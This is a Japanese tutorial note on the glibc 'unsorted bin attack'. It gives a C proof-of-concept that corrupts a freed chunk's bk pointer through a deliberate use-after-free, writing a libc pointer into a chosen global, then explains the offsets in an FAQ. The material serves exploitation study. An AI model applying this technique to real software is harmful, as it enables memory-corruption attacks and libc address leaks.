## Unsorted bin attack

以下のソースコードをtcacheが有効になっていないlibc(libc-2.23.soのubuntu16.04.6など)を使用してソースコードを実行

<details>
  
```
  
#include <stdio.h>
#include <stdlib.h>

unsigned long remissions;

int main(void)
{

        puts("So we will be covering an unsorted bin attack.");
        puts("The unsorted bin is a doubly linked list.");
        puts("This attack will allow us to write a pointer to the address of our choosing.");
        puts("While this attack really doesn't give us much control over what we write, we can count on it being a ptr (which will probably be a 'large' integer)");
        puts("Let's get started.\n");

    printf("So our goal will be to overwrite the value of the 'remissions' global variable.\n");
    printf("It is at the bss address: \t%p\n", &remissions);
    printf("With the value: \t\t%0lx\n\n", remissions);

    printf("We will start by allocating two chunks. One to insert into the unsorted bin.\n");
    printf("The other to prevent consolidation with the top chunk.\n");

        unsigned long *ptr0 = malloc(0xf0);
    unsigned long *ptr1 = malloc(0x10);

        printf("We have allocated our first chunk at:\t%p\n", ptr0);

        printf("Now let's free it to insert it into the unsorted bin.\n\n");

        free(ptr0);

        printf("Now that it has been inserted into the unsorted bin, we can see it's fwd and bk pointers.\n");

    printf("fwd:\t0x%lx\n", ptr0[0]);
    printf("bk:\t0x%lx\n\n", ptr0[1]);

    printf("Now when a chunk gets removed from the unsorted bin, a pointer to gets written to it's back chunk.\n");
    printf("Specifically a pointer will get written to bk + 0x10 on x64 (bk + 0x8 for x86).\n");
    printf("That is where we get our ptr write from.\n\n");

    printf("So by using a bug, we can edit the bk pointer of the freed chunk to point to remissions - 0x10.\n");
    printf("That way when the chunk leaves the unsorted bin, the pointer will be written to remissions.\n\n");

    ptr0[1] = (unsigned long)(&remissions - 0x2);

    printf("The current fwd and bk pointers after the write.\n");
    printf("fwd:\t0x%lx\n", ptr0[0]);
    printf("bk:\t0x%lx\n\n", ptr0[1]);


    printf("Now we allocate a new chunk of the same size to remove our freed chunk from the unsorted bin.");
    printf("This will trigger the write to remissions, which has a current value of 0x%lx\n", remissions);

    malloc(0xf0);

    printf("Now we can see that the value of remissions has changed.\n");
    printf("remissions:\t0x%lx\n", remissions);

}

```

</details>

### 概要

このプログラムは以下のステップで「Unsorted Bin Attack」を実演しています：  
  
セットアップ：  
グローバル変数 remissions が宣言されています。これが攻撃のターゲットです。  
プログラムはこの変数のアドレスと初期値を表示します。  
  
  
メモリ割り当て：  
ptr0 = malloc(0xf0) で0xf0バイトのメモリブロックを割り当てます。  
ptr1 = malloc(0x10) で小さなブロックを割り当てます（これはトップチャンクとの結合を防ぐため）。  
  
  
Unsorted Binへの挿入：  
free(ptr0) でptr0を解放し、Unsorted Binに挿入します。  
Unsorted Binは双方向リンクリストなので、解放されたチャンクにはforward（fwd）とbackward（bk）ポインタが含まれます。  
  
  
脆弱性の悪用：  
ptr0[1] = (unsigned long)(&remissions - 0x2) で解放済みのptr0のbkポインタを改ざんします。  
具体的には、remissionsのアドレスから0x10（x64では）を引いた値を指すように設定します。  
  
  
攻撃のトリガー：  
malloc(0xf0) で新しいチャンクを割り当てます。  
このとき、Unsorted Binから解放済みのチャンクが取り出され、bkポインタにはリンクリスト管理用のポインタが書き込まれます。  
改ざんしたbkポインタにより、この書き込みが remissions 変数に起こります。  
  
  
結果：  
remissions の値がメインアリーナへのポインタ（大きな値）に変更されています。  
  
  
重要なポイント  
  
Unsorted Binは、glibc malllocの実装で使用される双方向リンクリストです。  
解放されたチャンクがUnsorted Binから取り出されるとき、メモリ管理のためのポインタ更新が行われます。  
このコードはbkポインタを改ざんすることで、本来書き込まれるべきではない場所（remissions変数）にポインタが書き込まれるようにしています。  
この攻撃の結果、任意のメモリ位置に予測可能な値（通常は大きなポインタ値）を書き込むことができます。  

この技術は、実際のセキュリティ脆弱性の例示であり、教育目的で示されています。このような手法は、メモリ破壊バグを利用して攻撃者がシステムを侵害する方法の一例です。


### FAQ
  
Q.  
ptr0[1] = (unsigned long)(&remissions - 0x2)についてですが  
・unsortedbinに挿入されたptr0を操作することができるということでしょうか？  
・ptr0[1]というのはbkということでしょうか？  
・なぜ(unsigned long)(&remissions - 0x2)なのでしょうか？  
・なぜremissionsのアドレスから0x10（x64では）を引いた値を指すように設定なのでしょうか?  
  
  
A.  
ptr0を操作できる理由  
はい、unsorted binに挿入された（解放された）ptr0を操作できます。これは重要なセキュリティの問題点です。  
通常、メモリがfree()された後にそのメモリを参照・操作することは「use-after-free」と呼ばれるバグですが、このコードでは教育目的でこの問題を意図的に引き起こしています。  
実際の攻撃シナリオでは、何らかのプログラム上の脆弱性（バッファオーバーフローなど）を使って解放済みのメモリを操作します。  
ptr0[1]とbkの関係  
正確です。ptr0[1]はbkポインタを指しています。C言語でポインタ配列を扱う場合、ptr0[0]は最初の要素、ptr0[1]は2番目の要素になります。unsorted binに挿入されたチャンクの場合：  
  
ptr0[0] = 前方リンク（fwd）ポインタ  
ptr0[1] = 後方リンク（bk）ポインタ  
  
これらのポインタはunsorted binの双方向リンクリストを管理するために使われます。  
(unsigned long)(&remissions - 0x2)の意味  
これには2つのポイントがあります：  
  
&remissionsはremissions変数のメモリアドレスを取得しています  
-0x2は64ビットシステム（x64）では実質的に「-0x10バイト」を意味します  
  
なぜ「-0x2」なのかというと、このコードではunsigned long型のポインタを使っているため、アドレス計算が「要素単位」で行われます。  
x64システムではunsigned longは8バイト（64ビット）なので：  
  
-0x2は「2つのunsigned long要素分」だけ前に移動する  
2 × 8バイト = 16バイト = 0x10バイト  
  
つまり、(unsigned long)(&remissions - 0x2)は「remissionsのアドレスより16バイト（0x10）前のアドレス」を意味します。  
なぜremissionsのアドレスから0x10を引くのか  
コードのコメントにある通り：  
```
printf("Specifically a pointer will get written to bk + 0x10 on x64 (bk + 0x8 for x86).\n");
```

unsorted binからチャンクが取り出される際、メモリ管理システムはbkポインタが指すアドレスから0x10バイト先に特定のポインタ値を書き込みます。  
攻撃者の目的は「remissions変数にポインタを書き込む」ことなので、書き込み先がちょうどremissionsになるように逆算すると：  
  
書き込み先 = bkポインタの値 + 0x10  
remissions = bkポインタの値 + 0x10  
bkポインタの値 = remissions - 0x10  
  
この計算が「ptr0[1] = (unsigned long)(&remissions - 0x2)」という操作に反映されています。  
つまり、この操作によって、次回unsorted binからチャンクが取り出される際に、メモリ管理システムがbk + 0x10（つまりremissions）にポインタを書き込むように仕向けています。  
これがunsorted bin attackの本質です。  
→つまり、この攻撃によって次回unsorted binにポインタが書き込まれることでlibc leakに繋がる
